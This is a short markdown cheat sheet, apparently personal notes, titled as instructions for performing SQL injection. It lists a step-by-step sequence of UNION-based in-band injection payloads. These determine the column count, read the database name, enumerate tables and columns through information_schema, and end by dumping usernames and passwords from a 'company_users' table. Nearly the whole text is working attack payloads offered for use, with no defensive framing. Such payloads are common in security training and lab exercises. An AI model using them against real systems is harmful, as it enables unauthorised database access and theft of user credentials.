# To perfom successful sql injection attack :-

## First at In-Band SQL Injection type :

- You need to figure out **how many columns** do you have by using :

>1 UNION SELECT 1,2,3,4,.......

- When you figure out how many columns you need to break the query to make union select print whatever data it will returned 

0 UNION SELECT 1,2,3

- Now we need to know the name of the database 

0 UNION SELECT 1,2,database()

- Now we need to get the tables in that database

0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'teto_database'

- Now we know name of tables lets try to get data from it 

0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'company_users'

- Lets get the passwords 

0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM company_users
